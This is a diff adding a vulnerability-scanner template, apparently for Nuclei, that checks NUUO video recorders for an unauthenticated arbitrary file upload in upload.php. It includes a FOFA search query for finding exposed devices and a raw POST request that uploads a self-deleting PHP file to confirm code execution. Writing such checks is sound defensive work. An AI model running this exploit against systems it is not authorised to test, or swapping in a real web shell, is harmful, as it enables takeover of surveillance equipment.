@@ -1,0 +1,51 @@
+id: nuuo-upload-fileupload
+info:
+  name: NUUO网络视频录像机 upload.php - fileupload
+  author: leadlife
+  severity: critical
+  description: NUUO网络视频录像机upload.php任意文件上传漏洞，未经身份验证攻击者可通过该漏洞上传恶意文件，造成服务器沦陷。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/NUUO/NUUO%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91%E5%BD%95%E5%83%8F%E6%9C%BAupload.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="www.nuuo.com/eHelpdesk.php"
+  tags: nuuo,fileupload,nvr,fileupload
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /upload.php HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Accept-Language: zh-CN
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Connection: keep-alive
+        Content-Type: multipart/form-data; boundary=--------ok4o88lom
+        accept: */*
+        Content-Length: 155
+
+        ----------ok4o88lom
+        Content-Disposition: form-data; name="userfile"; filename="{{filename}}.php"
+
+        <?php print("{{randstr}}");unlink(__FILE__);?>
+        ----------ok4o88lom--
+        
+      - |+
+        GET /{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_2,'{{randstr}}')
+        condition: and
